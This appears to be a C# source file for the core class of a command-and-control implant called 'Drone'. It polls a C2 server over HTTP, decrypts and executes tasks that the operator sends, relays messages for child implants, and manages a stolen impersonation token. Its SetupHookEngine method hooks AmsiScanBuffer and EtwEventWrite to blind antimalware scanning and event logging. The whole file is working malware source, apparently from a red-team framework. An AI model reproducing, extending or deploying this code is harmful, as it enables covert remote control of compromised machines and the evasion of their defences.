using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using DInvoke.DynamicInvoke;

using Drone.Handlers;
using Drone.Models;
using Drone.Utilities;

using MinHook;
using Win32 = Drone.Utilities.Win32;

namespace Drone;

public class Drone
{
    public Config Config { get; private set; }
    public Metadata Metadata { get; private set; }
    
    private Handler _handler;
    
    private readonly HookEngine _engine = new();
    private readonly ManualResetEvent _signal = new(false);

    private readonly List<DroneCommand> _commands = new();
    private readonly ConcurrentDictionary<string, CancellationTokenSource> _tokens = new();
    private readonly ConcurrentQueue<DroneTaskResponse> _outbound = new();
    
    private readonly List<Handler> _children = new();
    private readonly ConcurrentQueue<C2Message> _relay = new();

    public void Start()
    {
        Config = new Config();
        Metadata = Helpers.GenerateMetadata();

        LoadCommands();
        SetupHookEngine();

        _handler = GetHandler();
        _handler.Init(Metadata, Config);

        _handler.OnMessagesReceived += HandleC2Messages;
        _handler.Start().ConfigureAwait(false);
        
        _signal.WaitOne();
    }

    private async Task HandleC2Messages(IEnumerable<C2Message> messages)
    {
        // hook
        _engine.EnableHooks();

        foreach (var message in messages)
            await HandleC2Message(message);
        
        // unhook
        _engine.DisableHooks();

        await FlushOutboundQueue();
    }

    private async Task HandleC2Message(C2Message message)
    {
        if (!string.IsNullOrWhiteSpace(message.DroneId) && !message.DroneId.Equals(Metadata.Id))
        {
            _children.ForEach(h => h.SendMessages(new[] { message }));
            return;
        }
        
        // decrypt message
        IEnumerable<DroneTask> tasks;
        
        try
        {
            tasks = Crypto.DecryptObject<IEnumerable<DroneTask>>(message.Iv, message.Data, message.Checksum);
        }
        catch
        {
            return;
        }

        await HandleDroneTasks(tasks);
    }

    private async Task HandleDroneTasks(IEnumerable<DroneTask> tasks)
    {
        foreach (var task in tasks)
            await HandleDroneTask(task);
    }

    private async Task HandleDroneTask(DroneTask task)
    {
        var tokenSource = new CancellationTokenSource();
            
        // ignore if already present
        if (!_tokens.ContainsKey(task.Id))
        {
            // loop until added
            while (!_tokens.TryAdd(task.Id, tokenSource))
                await Task.Delay(10, tokenSource.Token);
        }
            
        var command = _commands.FirstOrDefault(c => c.Command == task.Command);
            
        if (command is null)
        {
            await SendError(task, $"Unknown command \"{task.Command}\".");

            while (!_tokens.TryRemove(task.Id, out _))
                await Task.Delay(10, tokenSource.Token);
            
            tokenSource.Cancel();
            tokenSource.Dispose();

            return;
        }
            
        // wait or not
        if (command.Blocking)
        {
            await ExecuteDroneCommand(command, task, tokenSource.Token);
        }
        else
        {
            _ = Task.Run(
                async () => await ExecuteDroneCommand(command, task, tokenSource.Token),
                tokenSource.Token);
        }
    }
    
    private async Task ExecuteDroneCommand(DroneCommand command, DroneTask task, CancellationToken token)
    {
        try
        {
            // always block here
            await command.Execute(task, token);
        }
        catch (OperationCanceledException)
        {
            await SendTaskComplete(task);
        }
        catch (Exception e)
        {
            await SendError(task, e.Message);
        }

        // token isn't in dict, just return
        if (!_tokens.ContainsKey(task.Id))
            return;

        // loop until removed
        CancellationTokenSource tokenSource;
        
        while (!_tokens.TryRemove(task.Id, out tokenSource))
            await Task.Delay(10, token);

        tokenSource.Dispose();
    }

    public async Task SendError(DroneTask task, string error)
    {
        var taskOutput = new DroneTaskResponse
        {
            TaskId = task.Id,
            Status = DroneTaskStatus.Aborted,
            Module = 0x01,
            Output = Encoding.UTF8.GetBytes(error)
        };
        
        await SendDroneTaskOutput(taskOutput);
    }

    public async Task SendOutput(DroneTask task, string output, bool stillRunning = false)
    {
        var taskOutput = new DroneTaskResponse
        {
            TaskId = task.Id,
            Status = stillRunning ? DroneTaskStatus.Running : DroneTaskStatus.Complete,
            Module = 0x01,
            Output = Encoding.UTF8.GetBytes(output)
        };

        await SendDroneTaskOutput(taskOutput);
    }

    public async Task SendTaskRunning(DroneTask task)
    {
        var response = new DroneTaskResponse
        {
            TaskId = task.Id,
            Status = DroneTaskStatus.Running,
            Module = 0x01
        };
        
        await SendDroneTaskOutput(response);
    }

    public async Task SendTaskComplete(DroneTask task)
    {
        var output = new DroneTaskResponse
        {
            TaskId = task.Id,
            Status = DroneTaskStatus.Complete,
            Module = 0x01
        };
        
        await SendDroneTaskOutput(output);
    }
    
    public async Task SendDroneTaskOutput(DroneTaskResponse taskResponse)
    {
        _outbound.Enqueue(taskResponse);
        await Task.CompletedTask;
    }

    private async Task FlushOutboundQueue()
    {
        List<C2Message> messages = new();

        if (!_outbound.IsEmpty)
        {
            List<DroneTaskResponse> outputs = new();

            while (_outbound.TryDequeue(out var output))
                outputs.Add(output);

            var enc = Crypto.EncryptObject(outputs);
            
            messages.Add(new C2Message
            {
                DroneId = Metadata.Id,
                Iv = enc.iv,
                Data = enc.data,
                Checksum = enc.checksum
            });
        }

        if (!messages.Any())
            return;
        
        await _handler.SendMessages(messages);
    }

    public bool CancelTask(string taskId)
    {
        // false if thread isn't there
        if (!_tokens.ContainsKey(taskId))
            return false;

        // loop until we have it
        CancellationTokenSource tokenSource;
        while (!_tokens.TryRemove(taskId, out tokenSource))
            Thread.Sleep(10);

        // cancel the token
        tokenSource.Cancel();
        tokenSource.Dispose();
        
        return true;
    }

    public void AddChildHandler(Handler handler)
    {
        handler.OnMessagesReceived += RelayChildMessages;
        _children.Add(handler);
    }

    public void RemoveChildHandler(Handler handler)
    {
        handler.OnMessagesReceived -= RelayChildMessages;
        _children.Remove(handler);
    }

    private async Task RelayChildMessages(IEnumerable<C2Message> messages)
    {
        // send them
        await _handler.SendMessages(messages);
    }

    public async Task Stop(DroneTask task)
    {
        // send notification immediately
        var responses = new DroneTaskResponse[]
        {
            new()
            {
                TaskId = task.Id,
                Module = 0x22,
                Status = DroneTaskStatus.Complete
            }
        };

        var enc = Crypto.EncryptObject(responses);

        await _handler.SendMessages(new C2Message[]
        {
            new()
            {
                DroneId = Metadata.Id,
                Iv = enc.iv,
                Data = enc.data,
                Checksum = enc.checksum
            }
        });
        
        // give things time to flush out
        await Task.Delay(new TimeSpan(0, 0, 10));

        _handler.Stop();
        _signal.Set();
    }

    private void LoadCommands()
    {
        var self = Assembly.GetExecutingAssembly();

        foreach (var type in self.GetTypes())
        {
            if (!type.IsSubclassOf(typeof(DroneCommand)))
                continue;

            var command = (DroneCommand) Activator.CreateInstance(type);
            command.Init(this);
            
            _commands.Add(command);
        }
    }

    private void SetupHookEngine()
    {
        // force amsi.dll to load
        var hAmsi = Generic.LoadModuleFromDisk("amsi.dll");
        
        var hAsb = Generic.GetExportAddress(hAmsi, "AmsiScanBuffer");
        var hEew = Generic.GetLibraryAddress("ntdll.dll", "EtwEventWrite");

        _engine.CreateHook(hAsb, new Delegates.AmsiScanBuffer(Detours.AmsiScanBuffer));
        _engine.CreateHook(hEew, new Delegates.EtwEventWrite(Detours.EtwEventWrite));
    }

    private IntPtr _token;
    public IntPtr ImpersonationToken
    {
        get => _token;
        set
        {
            try
            {
                Win32.CloseHandle(_token);
            }
            catch
            {
                // ignore
            }
            
            _token = value;
        }
    }
    
    private static Handler GetHandler()
        => new HttpHandler();
}